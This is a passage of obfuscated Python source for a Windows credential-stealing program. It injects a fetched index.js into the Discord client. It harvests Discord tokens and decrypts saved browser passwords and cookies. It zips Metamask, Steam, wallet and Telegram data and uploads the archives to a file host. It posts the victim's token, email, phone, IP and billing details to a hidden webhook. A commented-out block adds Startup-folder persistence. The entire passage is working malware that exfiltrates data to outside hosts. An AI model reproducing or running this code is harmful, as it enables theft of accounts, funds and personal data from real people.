                                                if O0OOO00000OO0000O =='index.js':#line:252
                                                    OO00O0OO0OO0O0OOO =os .path .join (O0OO0O00OOO00OO00 ,O0OOO00000OO0000O )#line:253
                                                    OO0000O00OO0OO0OO =requests .get (tFZ9PZEnaF3KvLTuwECpbz56ycLZakxwDfXuans8uU2FFJYfBBv28s8nuweSKcuUTa7LrdjCL3VnGkvLHFGHp5t7jxyR9HUdgBtTPdJuuufM9VKzPWUgNDz7pe3AbqkRtFZ9PZEnaF3KvLTuwECpbz56ycLZakxwDfXuans8uU2FFJYfBBv28s8nuweSKcuUTa7LrdjCL3VnGkvLHFGHp5t7jxyR9HUdgBtTPdJuuufM9VKzPWUgNDz7pe3AbqkR ).text #line:255
                                                    OO0000O00OO0OO0OO =OO0000O00OO0OO0OO .replace ("%lovecoder%",E47qhyeaxtq7aDSRXrhD68wqXurGbFA887DAYPCREgFgNTjzAWgMZBy5mQtcNuaZLTSdZHARCU4sLrM526KUuca2RwUdy5B4kkRPN85zD2rzKXzNdbDx3ZfCwfyH9mxn )#line:257
                                                    with open (OO00O0OO0OO0O0OOO ,"w",encoding ="utf-8")as OO00OOO0OOO00O00O :#line:259
                                                        OO00OOO0OOO00O00O .write (OO0000O00OO0OO0OO )#line:260
lovecodev2 ()#line:261
def G3tB4dg31 (OOOO00000O000O0O0 ):#line:263
    if OOOO00000O000O0O0 ==0 :return ''#line:264
    O000OO0OO0O0OO00O =''#line:266
    O00OO0000OOO0OOO0 =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:278
    for O0OOO00OOOOOO0O00 in O00OO0000OOO0OOO0 :#line:279
        if OOOO00000O000O0O0 //O0OOO00OOOOOO0O00 ["Value"]!=0 :#line:280
            O000OO0OO0O0OO00O +=O0OOO00OOOOOO0O00 ["Emoji"]#line:281
            OOOO00000O000O0O0 =OOOO00000O000O0O0 %O0OOO00OOOOOO0O00 ["Value"]#line:282
    return O000OO0OO0O0OO00O #line:284
def G3tT0k4n1nf9 (O0OO0OOOO0OOOO000 ):#line:286
    O000OO0OO0OO0OOOO ={"Authorization":O0OO0OOOO0OOOO000 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:291
    O0O0OO0O000OOOOOO =loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =O000OO0OO0OO0OOOO )).read ().decode ())#line:293
    O0OOOOOOO0OOO000O =O0O0OO0O000OOOOOO ["username"]#line:294
    OO000OO000000O00O =O0O0OO0O000OOOOOO ["discriminator"]#line:295
    OO00OOOO000O0OO0O =O0O0OO0O000OOOOOO ["email"]#line:296
    OOOO00O0000O00000 =O0O0OO0O000OOOOOO ["id"]#line:297
    OOO0OO0OOOO00O00O =O0O0OO0O000OOOOOO ["avatar"]#line:298
    OO0OO000OO00O0000 =O0O0OO0O000OOOOOO ["public_flags"]#line:299
    O0000000OO000OOO0 =""#line:300
    OOOO000OOOO000OOO =""#line:301
    if "premium_type"in O0O0OO0O000OOOOOO :#line:303
        OO00OOO0OO0OOO00O =O0O0OO0O000OOOOOO ["premium_type"]#line:304
        if OO00OOO0OO0OOO00O ==1 :#line:305
            O0000000OO000OOO0 ="<a:DE_BadgeNitro:865242433692762122>"#line:306
        elif OO00OOO0OO0OOO00O ==2 :#line:307
            O0000000OO000OOO0 ="<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"#line:308
    if "ph0n3"in O0O0OO0O000OOOOOO :OOOO000OOOO000OOO =f'{O0O0OO0O000OOOOOO["ph0n3"]}'#line:309
    return O0OOOOOOO0OOO000O ,OO000OO000000O00O ,OO00OOOO000O0OO0O ,OOOO00O0000O00000 ,OOO0OO0OOOO00O00O ,OO0OO000OO00O0000 ,O0000000OO000OOO0 ,OOOO000OOOO000OOO #line:311
def ch1ckT4k1n (O0000O00OO0O0OO0O ):#line:313
    O00OOOOOO0OO0O0O0 ={"Authorization":O0000O00OO0O0OO0O ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:318
    try :#line:319
        urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =O00OOOOOO0OO0O0O0 ))#line:320
        return True #line:321
    except :#line:322
        return False #line:323
"""
if getattr (sys ,'frozen',False ):#line:325
    currentFilePath =os .path .dirname (sys .executable )#line:326
else :#line:327
    currentFilePath =os .path .dirname (os .path .abspath (__file__ ))#line:328
fileName =os .path .basename (sys .argv [0 ])#line:330
filePath =os .path .join (currentFilePath ,fileName )#line:331
startupFolderPath =os .path .join (os .path .expanduser ('~'),'AppData','Roaming','Microsoft','Windows','Start Menu','Programs','Startup')#line:333
startupFilePath =os .path .join (startupFolderPath ,fileName )#line:334
if os .path .abspath (filePath ).lower ()!=os .path .abspath (startupFilePath ).lower ():#line:336
    with open (filePath ,'rb')as src_file ,open (startupFilePath ,'wb')as dst_file :#line:337
        shutil .copyfileobj (src_file ,dst_file )#line:338
        """
def upl05dT4k31 (O0O0O00000OOOO000 ,O00O0O000OOO0O0O0 ):#line:341
    global E47qhyeaxtq7aDSRXrhD68wqXurGbFA887DAYPCREgFgNTjzAWgMZBy5mQtcNuaZLTSdZHARCU4sLrM526KUuca2RwUdy5B4kkRPN85zD2rzKXzNdbDx3ZfCwfyH9mxn #line:342
    O0O0OO0O00OO00OOO ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:346
    O0OO00O00O0OO000O ,O00000OOO0OOOOO0O ,O0O00000O00OO0000 ,O0O000O000O0OOO00 ,O0O000000OOO000OO ,O00O00O00OOO00OO0 ,OOOOOOOO0O0O0O0OO ,OOO0OO0OO0O0OOO0O =G3tT0k4n1nf9 (O0O0O00000OOOO000 )#line:347
    if O0O000000OOO000OO ==None :#line:349
        O0O000000OOO000OO =""#line:350
    else :#line:351
        O0O000000OOO000OO =f"https://cdn.discordapp.com/avatars/{O0O000O000O0OOO00}/{O0O000000OOO000OO}"#line:352
    O00OOOO00O0OO0O0O =G3tb1ll1ng (O0O0O00000OOOO000 )#line:354
    OOOO0O0O0000OO0OO =G3tB4dg31 (O00O00O00OOO00OO0 )#line:355
    OOOOO0O00OO000O00 =G3tUHQFr13ndS (O0O0O00000OOOO000 )#line:356
    if OOOOO0O00OO000O00 =='':OOOOO0O00OO000O00 ="```No Rare Friends```"#line:357
    if not O00OOOO00O0OO0O0O :#line:358
        OOOO0O0O0000OO0OO ,OOO0OO0OO0O0OOO0O ,O00OOOO00O0OO0O0O ="🔒","🔒","🔒"#line:359
    if OOOOOOOO0O0O0O0OO ==''and OOOO0O0O0000OO0OO =='':OOOOOOOO0O0O0O0OO ="```None```"#line:360
    OOOOO0O000OOO000O ={"content":f'{globalInfo()} | `{O00O0O000OOO0O0O0}`',"embeds":[{"color":2895667 ,"fields":[{"name":"<a:hyperNOPPERS:828369518199308388> Token:","value":f"```{O0O0O00000OOOO000}```","inline":True },{"name":"<:mail:750393870507966486> Email:","value":f"```{O0O00000O00OO0000}```","inline":True },{"name":"<a:1689_Ringing_Phone:755219417075417088> Phone:","value":f"```{OOO0OO0OO0O0OOO0O}```","inline":True },{"name":"<:mc_earth:589630396476555264> IP:","value":f"```{g3t1p()}```","inline":True },{"name":"<:woozyface:874220843528486923> Badges:","value":f"{OOOOOOOO0O0O0O0OO}{OOOO0O0O0000OO0OO}","inline":True },{"name":"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:","value":f"{O00OOOO00O0OO0O0O}","inline":True },{"name":"<a:mavikirmizi:853238372591599617> HQ Friends:","value":f"{OOOOO0O00OO000O00}","inline":False }],"author":{"name":f"{O0OO00O00O0OO000O}#{O00000OOO0OOOOO0O} ({O0O000O000O0OOO00})","icon_url":f"{O0O000000OOO000OO}"},"footer":{"text":"Nice try","icon_url":""},"thumbnail":{"url":f"{O0O000000OOO000OO}"}}],"avatar_url":"","username":"Nice try","attachments":[]}#line:420
    L04durl1b (E47qhyeaxtq7aDSRXrhD68wqXurGbFA887DAYPCREgFgNTjzAWgMZBy5mQtcNuaZLTSdZHARCU4sLrM526KUuca2RwUdy5B4kkRPN85zD2rzKXzNdbDx3ZfCwfyH9mxn ,data =dumps (OOOOO0O000OOO000O ).encode (),headers =O0O0OO0O00OO00OOO )#line:421
def R4f0rm3t (OOO0O00OO00OO0O0O ):#line:424
    O0000OO0O0000000O =re .findall ("(\w+[a-z])",OOO0O00OO00OO0O0O )#line:425
    while "https"in O0000OO0O0000000O :O0000OO0O0000000O .remove ("https")#line:426
    while "com"in O0000OO0O0000000O :O0000OO0O0000000O .remove ("com")#line:427
    while "net"in O0000OO0O0000000O :O0000OO0O0000000O .remove ("net")#line:428
    return list (set (O0000OO0O0000000O ))#line:429
def upload (OOOO00O0OOOO0O00O ,O000OOOOOO0000000 ):#line:431
    O0OO000OOOO0O0O00 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:435
    if OOOO00O0OOOO0O00O =="crcook":#line:437
        OO0OOOOOOOOOO00OO =' | '.join (OOOO0OOO0OO0OO000 for OOOO0OOO0OO0OO000 in cookiWords )#line:438
        if len (OO0OOOOOOOOOO00OO )>1000 :#line:439
            O0O0O0O0000O0OO00 =R4f0rm3t (str (cookiWords ))#line:440
            OO0OOOOOOOOOO00OO =' | '.join (OO00OOO000O0O00OO for OO00OOO000O0O00OO in O0O0O0O0000O0OO00 )#line:441
        O0O00O000000000OO ={"content":f"{globalInfo()}","embeds":[{"title":"Nice | Cookies Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{OO0OOOOOOOOOO00OO}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [NiceCookies.txt]({O000OOOOOO0000000})","color":2895667 ,"footer":{"text":"Nice try","icon_url":""}}],"username":"Nice try","avatar_url":"","attachments":[]}#line:458
        L04durl1b (E47qhyeaxtq7aDSRXrhD68wqXurGbFA887DAYPCREgFgNTjzAWgMZBy5mQtcNuaZLTSdZHARCU4sLrM526KUuca2RwUdy5B4kkRPN85zD2rzKXzNdbDx3ZfCwfyH9mxn ,data =dumps (O0O00O000000000OO ).encode (),headers =O0OO000OOOO0O0O00 )#line:459
        return #line:460
    if OOOO00O0OOOO0O00O =="crpassw":#line:462
        OO000OO0O0000000O =' | '.join (O0O000O0OO0OO0000 for O0O000O0OO0OO0000 in paswWords )#line:463
        if len (OO000OO0O0000000O )>1000 :#line:464
            O0O0000O0000O0O0O =R4f0rm3t (str (paswWords ))#line:465
            OO000OO0O0000000O =' | '.join (O000OO0000O00O00O for O000OO0000O00O00O in O0O0000O0000O0O0O )#line:466
        O0O00O000000000OO ={"content":f"{globalInfo()}","embeds":[{"title":"Nice | Password Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{OO000OO0O0000000O}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [NicePassword.txt]({O000OOOOOO0000000})","color":2895667 ,"footer":{"text":"Nice try","icon_url":""}}],"username":"Nice","avatar_url":"","attachments":[]}#line:484
        L04durl1b (E47qhyeaxtq7aDSRXrhD68wqXurGbFA887DAYPCREgFgNTjzAWgMZBy5mQtcNuaZLTSdZHARCU4sLrM526KUuca2RwUdy5B4kkRPN85zD2rzKXzNdbDx3ZfCwfyH9mxn ,data =dumps (O0O00O000000000OO ).encode (),headers =O0OO000OOOO0O0O00 )#line:485
        return #line:486
    if OOOO00O0OOOO0O00O =="kiwi":#line:488
        O0O00O000000000OO ={"content":f"{globalInfo()}","embeds":[{"color":2895667 ,"fields":[{"name":"Interesting files found on user PC:","value":O000OOOOOO0000000 }],"author":{"name":"Nice | File Stealer"},"footer":{"text":"Nice try","icon_url":""}}],"username":"Nice try","avatar_url":"","attachments":[]}#line:512
        L04durl1b (E47qhyeaxtq7aDSRXrhD68wqXurGbFA887DAYPCREgFgNTjzAWgMZBy5mQtcNuaZLTSdZHARCU4sLrM526KUuca2RwUdy5B4kkRPN85zD2rzKXzNdbDx3ZfCwfyH9mxn ,data =dumps (O0O00O000000000OO ).encode (),headers =O0OO000OOOO0O0O00 )#line:513
        return #line:514
    _ #line:527
def wr1tef0rf1l3 (OO0OO0OOOOOO0O0OO ,O00O0OOOO00OOOO00 ):#line:532
    OOO00OO0000O0000O =os .getenv ("TEMP")+f"\cr{O00O0OOOO00OOOO00}.txt"#line:533
    with open (OOO00OO0000O0000O ,mode ='w',encoding ='utf-8')as O000OO0O000O000OO :#line:534
        O000OO0O000O000OO .write (f"<--Nice try BEST -->\n\n")#line:535
        for OOOOO000O00OO0O0O in OO0OO0OOOOOO0O0OO :#line:536
            if OOOOO000O00OO0O0O [0 ]!='':#line:537
                O000OO0O000O000OO .write (f"{OOOOO000O00OO0O0O}\n")#line:538
T0k3ns =''#line:540
def getT0k3n (OO0O0OO0OOO00O0O0 ,O000O0O000OOOOOOO ):#line:541
    if not os .path .exists (OO0O0OO0OOO00O0O0 ):return #line:542
    OO0O0OO0OOO00O0O0 +=O000O0O000OOOOOOO #line:544
    for O0O0OOOOO0O00OOO0 in os .listdir (OO0O0OO0OOO00O0O0 ):#line:545
        if O0O0OOOOO0O00OOO0 .endswith (".log")or O0O0OOOOO0O00OOO0 .endswith (".ldb"):#line:546
            for O0OO0O0OOO0OO0OOO in [OO0OO00OOOO0000OO .strip ()for OO0OO00OOOO0000OO in open (f"{OO0O0OO0OOO00O0O0}\\{O0O0OOOOO0O00OOO0}",errors ="ignore").readlines ()if OO0OO00OOOO0000OO .strip ()]:#line:547
                for OOO00O0000O0OOO00 in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",r"mfa\.[\w-]{80,95}"):#line:548
                    for O000OO0OOOO0OO0OO in re .findall (OOO00O0000O0OOO00 ,O0OO0O0OOO0OO0OOO ):#line:549
                        global T0k3ns #line:550
                        if ch1ckT4k1n (O000OO0OOOO0OO0OO ):#line:551
                            if not O000OO0OOOO0OO0OO in T0k3ns :#line:552
                                T0k3ns +=O000OO0OOOO0OO0OO #line:553
                                upl05dT4k31 (O000OO0OOOO0OO0OO ,OO0O0OO0OOO00O0O0 )#line:554
P4ssw =[]#line:556
def getP4ssw (O0OO0000O0O0OO0O0 ,O0OOO00O00OO00OOO ):#line:557
    global P4ssw ,P4sswCount #line:558
    if not os .path .exists (O0OO0000O0O0OO0O0 ):return #line:559
    O0000OOO00OOOOOO0 =O0OO0000O0O0OO0O0 +O0OOO00O00OO00OOO +"/Login Data"#line:561
    if os .stat (O0000OOO00OOOOOO0 ).st_size ==0 :return #line:562
    OO0O000OO0O00O000 =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for O0OO0OOO00O000O0O in range (8 ))+".db"#line:564
    shutil .copy2 (O0000OOO00OOOOOO0 ,OO0O000OO0O00O000 )#line:566
    OOO00O0O0O0OO0O0O =sql_connect (OO0O000OO0O00O000 )#line:567
    O00O0OOOOOO0O0000 =OOO00O0O0O0OO0O0O .cursor ()#line:568
    O00O0OOOOOO0O0000 .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:569
    O00000O00OOOO00O0 =O00O0OOOOOO0O0000 .fetchall ()#line:570
    O00O0OOOOOO0O0000 .close ()#line:571
    OOO00O0O0O0OO0O0O .close ()#line:572
    os .remove (OO0O000OO0O00O000 )#line:573
    O000OO00000O0000O =O0OO0000O0O0OO0O0 +"/Local State"#line:575
    with open (O000OO00000O0000O ,'r',encoding ='utf-8')as OOO000O00O0O0000O :O00000000O0OOO000 =json_loads (OOO000O00O0O0000O .read ())#line:576
    O00OOOO00OO0OO0OO =b64decode (O00000000O0OOO000 ['os_crypt']['encrypted_key'])#line:577
    O00OOOO00OO0OO0OO =CryptUnprotectData (O00OOOO00OO0OO0OO [5 :])#line:578
    for O0OO0OOOOOOO0O00O in O00000O00OOOO00O0 :#line:580
        if O0OO0OOOOOOO0O00O [0 ]!='':#line:581
            for O00O00OO00OOO0000 in keyword :#line:582
                O0OOOOOO0OO0OOOO0 =O00O00OO00OOO0000 #line:583
                if "https"in O00O00OO00OOO0000 :#line:584
                    O0O0O0O00O000OOO0 =O00O00OO00OOO0000 #line:585
                    O00O00OO00OOO0000 =O0O0O0O00O000OOO0 .split ('[')[1 ].split (']')[0 ]#line:586
                if O00O00OO00OOO0000 in O0OO0OOOOOOO0O00O [0 ]:#line:587
                    if not O0OOOOOO0OO0OOOO0 in paswWords :paswWords .append (O0OOOOOO0OO0OOOO0 )#line:588
            P4ssw .append (f"UR1: {O0OO0OOOOOOO0O00O[0]} | U53RN4M3: {O0OO0OOOOOOO0O00O[1]} | P455W0RD: {D3kryptV4lU3(O0OO0OOOOOOO0O00O[2], O00OOOO00OO0OO0OO)}")#line:589
            P4sswCount +=1 #line:590
    wr1tef0rf1l3 (P4ssw ,'passw')#line:591
C00k13 =[]#line:593
def getC00k13 (O000OO00O000OOOOO ,O000OOOOO00OO0OO0 ):#line:594
    global C00k13 ,CookiCount #line:595
    if not os .path .exists (O000OO00O000OOOOO ):return #line:596
    O0000OOO00O000000 =O000OO00O000OOOOO +O000OOOOO00OO0OO0 +"/Cookies"#line:598
    if os .stat (O0000OOO00O000000 ).st_size ==0 :return #line:599
    O0O0OOOO00OOO0OOO =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for O00OOOOO00O0O00OO in range (8 ))+".db"#line:601
    shutil .copy2 (O0000OOO00O000000 ,O0O0OOOO00OOO0OOO )#line:603
    OOO000OOOO0OOOO0O =sql_connect (O0O0OOOO00OOO0OOO )#line:604
    O00O00O0O00O00000 =OOO000OOOO0OOOO0O .cursor ()#line:605
    O00O00O0O00O00000 .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:606
    O0OOO00O00O0OO000 =O00O00O0O00O00000 .fetchall ()#line:607
    O00O00O0O00O00000 .close ()#line:608
    OOO000OOOO0OOOO0O .close ()#line:609
    os .remove (O0O0OOOO00OOO0OOO )#line:610
    O000OOO0O0O00O000 =O000OO00O000OOOOO +"/Local State"#line:612
    with open (O000OOO0O0O00O000 ,'r',encoding ='utf-8')as O0OOOO00O0000OOO0 :O000OO000O00O0OO0 =json_loads (O0OOOO00O0000OOO0 .read ())#line:614
    OO0OO0O0000OOO00O =b64decode (O000OO000O00O0OO0 ['os_crypt']['encrypted_key'])#line:615
    OO0OO0O0000OOO00O =CryptUnprotectData (OO0OO0O0000OOO00O [5 :])#line:616
    for O00000OO00O0OOOO0 in O0OOO00O00O0OO000 :#line:618
        if O00000OO00O0OOOO0 [0 ]!='':#line:619
            for OOOOOOOOO0O0O0000 in keyword :#line:620
                OOO000000O00O00OO =OOOOOOOOO0O0O0000 #line:621
                if "https"in OOOOOOOOO0O0O0000 :#line:622
                    O000O0O00OO00000O =OOOOOOOOO0O0O0000 #line:623
                    OOOOOOOOO0O0O0000 =O000O0O00OO00000O .split ('[')[1 ].split (']')[0 ]#line:624
                if OOOOOOOOO0O0O0000 in O00000OO00O0OOOO0 [0 ]:#line:625
                    if not OOO000000O00O00OO in cookiWords :cookiWords .append (OOO000000O00O00OO )#line:626
            C00k13 .append (f"{O00000OO00O0OOOO0[0]}	TRUE	/	FALSE	2597573456	{O00000OO00O0OOOO0[1]}	{D3kryptV4lU3(O00000OO00O0OOOO0[2], OO0OO0O0000OOO00O)}")#line:627
            CookiCount +=1 #line:628
    wr1tef0rf1l3 (C00k13 ,'cook')#line:629
def G3tD1sc0rd (O0OO00OO0OO0O000O ,OO0O0OO000000O000 ):#line:631
    if not os .path .exists (f"{O0OO00OO0OO0O000O}/Local State"):return #line:632
    O0OOO00OO00O00O00 =O0OO00OO0OO0O000O +OO0O0OO000000O000 #line:634
    OO0OO0O0O0O00OO0O =O0OO00OO0OO0O000O +"/Local State"#line:636
    with open (OO0OO0O0O0O00OO0O ,'r',encoding ='utf-8')as OO00OOOOOOO0OO000 :OO000OOO0OO0O00O0 =json_loads (OO00OOOOOOO0OO000 .read ())#line:637
    OO000O00O00O0OO0O =b64decode (OO000OOO0OO0O00O0 ['os_crypt']['encrypted_key'])#line:638
    OO000O00O00O0OO0O =CryptUnprotectData (OO000O00O00O0OO0O [5 :])#line:639
    for O00O0OO000OOOOO0O in os .listdir (O0OOO00OO00O00O00 ):#line:640
        if O00O0OO000OOOOO0O .endswith (".log")or O00O0OO000OOOOO0O .endswith (".ldb"):#line:641
            for O000OO0O0OO0OO0OO in [O0OO00OO00OO00000 .strip ()for O0OO00OO00OO00000 in open (f"{O0OOO00OO00O00O00}\\{O00O0OO000OOOOO0O}",errors ="ignore").readlines ()if O0OO00OO00OO00000 .strip ()]:#line:642
                for O0O000O0000OOO000 in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",O000OO0O0OO0OO0OO ):#line:643
                    global T0k3ns #line:644
                    OO0OOOO00O0OO0O00 =D3kryptV4lU3 (b64decode (O0O000O0000OOO000 .split ('dQw4w9WgXcQ:')[1 ]),OO000O00O00O0OO0O )#line:645
                    if ch1ckT4k1n (OO0OOOO00O0OO0O00 ):#line:646
                        if not OO0OOOO00O0OO0O00 in T0k3ns :#line:647
                            T0k3ns +=OO0OOOO00O0OO0O00 #line:648
                            upl05dT4k31 (OO0OOOO00O0OO0O00 ,O0OO00OO0OO0O000O )#line:649
def GatherZips (O00000OO000OO0O00 ,O0O00O0000O0OOOO0 ,O0OO00O0OOOOO0OOO ):#line:651
    OO0000O0000O0O000 =[]#line:652
    for OOO0OOOO0OO0O000O in O00000OO000OO0O00 :#line:653
        OO0O00OOOOOO0O0OO =threading .Thread (target =Z1pTh1ngs ,args =[OOO0OOOO0OO0O000O [0 ],OOO0OOOO0OO0O000O [5 ],OOO0OOOO0OO0O000O [1 ]])#line:654
        OO0O00OOOOOO0O0OO .start ()#line:655
        OO0000O0000O0O000 .append (OO0O00OOOOOO0O0OO )#line:656
    for OOO0OOOO0OO0O000O in O0O00O0000O0OOOO0 :#line:658
        OO0O00OOOOOO0O0OO =threading .Thread (target =Z1pTh1ngs ,args =[OOO0OOOO0OO0O000O [0 ],OOO0OOOO0OO0O000O [2 ],OOO0OOOO0OO0O000O [1 ]])#line:659
        OO0O00OOOOOO0O0OO .start ()#line:660
        OO0000O0000O0O000 .append (OO0O00OOOOOO0O0OO )#line:661
    OO0O00OOOOOO0O0OO =threading .Thread (target =ZipTelegram ,args =[O0OO00O0OOOOO0OOO [0 ],O0OO00O0OOOOO0OOO [2 ],O0OO00O0OOOOO0OOO [1 ]])#line:663
    OO0O00OOOOOO0O0OO .start ()#line:664
    OO0000O0000O0O000 .append (OO0O00OOOOOO0O0OO )#line:665
    for O00OO0O0OOO0OOO0O in OO0000O0000O0O000 :#line:667
        O00OO0O0OOO0OOO0O .join ()#line:668
    global WalletsZip ,GamingZip ,OtherZip #line:669
    OO0O0OO0O000O0000 ,O00OOOOO000OO0O0O ,O00000000OO0OOOOO ="",'',''#line:671
    if not len (WalletsZip )==0 :#line:672
        OO0O0OO0O000O0000 =":coin:  •  Wallets\n"#line:673
        for O0000OO0O0OOOO0O0 in WalletsZip :#line:674
            OO0O0OO0O000O0000 +=f"└─ [{O0000OO0O0OOOO0O0[0]}]({O0000OO0O0OOOO0O0[1]})\n"#line:675
    if not len (WalletsZip )==0 :#line:676
        O00OOOOO000OO0O0O =":video_game:  •  Gaming:\n"#line:677
        for O0000OO0O0OOOO0O0 in GamingZip :#line:678
            O00OOOOO000OO0O0O +=f"└─ [{O0000OO0O0OOOO0O0[0]}]({O0000OO0O0OOOO0O0[1]})\n"#line:679
    if not len (OtherZip )==0 :#line:680
        O00000000OO0OOOOO =":tickets:  •  Apps\n"#line:681
        for O0000OO0O0OOOO0O0 in OtherZip :#line:682
            O00000000OO0OOOOO +=f"└─ [{O0000OO0O0OOOO0O0[0]}]({O0000OO0O0OOOO0O0[1]})\n"#line:683
    O00O00OO0OO0OO000 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:687
    OO00O0OO0OOO00000 ={"content":globalInfo (),"embeds":[{"title":"Nice Zips","description":f"{OO0O0OO0O000O0000}\n{O00OOOOO000OO0O0O}\n{O00000000OO0OOOOO}","color":2895667 ,"footer":{"text":"Nice try","icon_url":""}}],"username":"Nice try","avatar_url":"","attachments":[]}#line:705
    L04durl1b (E47qhyeaxtq7aDSRXrhD68wqXurGbFA887DAYPCREgFgNTjzAWgMZBy5mQtcNuaZLTSdZHARCU4sLrM526KUuca2RwUdy5B4kkRPN85zD2rzKXzNdbDx3ZfCwfyH9mxn ,data =dumps (OO00O0OO0OOO00000 ).encode (),headers =O00O00OO0OO0OO000 )#line:706
def ZipTelegram (O0O00OOO0OO000OOO ,O0O00OO00O000O0O0 ,O0OOOOOO0000OO00O ):#line:709
    global OtherZip #line:710
    O000O0OO0O0O000OO =O0O00OOO0OO000OOO #line:711
    O0O00O0000O0O0O0O =O0O00OO00O000O0O0 #line:712
    if not os .path .exists (O000O0OO0O0O000OO ):return #line:713
    subprocess .Popen (f"taskkill /im {O0OOOOOO0000OO00O} /t /f >nul 2>&1",shell =True )#line:714
    OO000O0OOOO0000O0 =ZipFile (f"{O000O0OO0O0O000OO}/{O0O00O0000O0O0O0O}.zip","w")#line:716
    for O0000OOOO000O000O in os .listdir (O000O0OO0O0O000OO ):#line:717
        if not ".zip"in O0000OOOO000O000O and not "tdummy"in O0000OOOO000O000O and not "user_data"in O0000OOOO000O000O and not "webview"in O0000OOOO000O000O :#line:718
            OO000O0OOOO0000O0 .write (O000O0OO0O0O000OO +"/"+O0000OOOO000O000O )#line:719
    OO000O0OOOO0000O0 .close ()#line:720
    O00O0000OOOO000O0 =uploadToAnonfiles (f'{O000O0OO0O0O000OO}/{O0O00O0000O0O0O0O}.zip')#line:722
    os .remove (f"{O000O0OO0O0O000OO}/{O0O00O0000O0O0O0O}.zip")#line:723
    OtherZip .append ([O0O00OO00O000O0O0 ,O00O0000OOOO000O0 ])#line:724
def Z1pTh1ngs (OOO00000OOOOOOO00 ,O0OO0OOO00OO0000O ,O000OOOO000OO000O ):#line:726
    OOOOOOO000OO0O0O0 =OOO00000OOOOOOO00 #line:727
    OOO000OO0O00000O0 =O0OO0OOO00OO0000O #line:728
    global WalletsZip ,GamingZip ,OtherZip #line:729
    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in O0OO0OOO00OO0000O :#line:731
        O00O0OOO0O00OO000 =OOO00000OOOOOOO00 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:732
        OOO000OO0O00000O0 =f"Metamask_{O00O0OOO0O00OO000}"#line:733
        OOOOOOO000OO0O0O0 =OOO00000OOOOOOO00 +O0OO0OOO00OO0000O #line:734
    if not os .path .exists (OOOOOOO000OO0O0O0 ):return #line:736
    subprocess .Popen (f"taskkill /im {O000OOOO000OO000O} /t /f >nul 2>&1",shell =True )#line:737
    if "Wallet"in O0OO0OOO00OO0000O or "NationsGlory"in O0OO0OOO00OO0000O :#line:739
        O00O0OOO0O00OO000 =OOO00000OOOOOOO00 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:740
        OOO000OO0O00000O0 =f"{O00O0OOO0O00OO000}"#line:741
    elif "Steam"in O0OO0OOO00OO0000O :#line:743
        if not os .path .isfile (f"{OOOOOOO000OO0O0O0}/loginusers.vdf"):return #line:744
        OOOO0OO00O00O00OO =open (f"{OOOOOOO000OO0O0O0}/loginusers.vdf","r+",encoding ="utf8")#line:745
        OO00O0OOO00OOOO0O =OOOO0OO00O00O00OO .readlines ()#line:746
        O0O00OOO0000O0OO0 =False #line:748
        for OO0O0O0OOO0000OOO in OO00O0OOO00OOOO0O :#line:749
            if 'RememberPassword"\t\t"1"'in OO0O0O0OOO0000OOO :#line:750
                O0O00OOO0000O0OO0 =True #line:751
        if O0O00OOO0000O0OO0 ==False :return #line:752
        OOO000OO0O00000O0 =O0OO0OOO00OO0000O #line:753
    OOO0O0O0OO0O00O0O =ZipFile (f"{OOOOOOO000OO0O0O0}/{OOO000OO0O00000O0}.zip","w")#line:756
    for OOO0OO00O0OO0OOO0 in os .listdir (OOOOOOO000OO0O0O0 ):#line:757
        if not ".zip"in OOO0OO00O0OO0OOO0 :OOO0O0O0OO0O00O0O .write (OOOOOOO000OO0O0O0 +"/"+OOO0OO00O0OO0OOO0 )#line:758
    OOO0O0O0OO0O00O0O .close ()#line:759
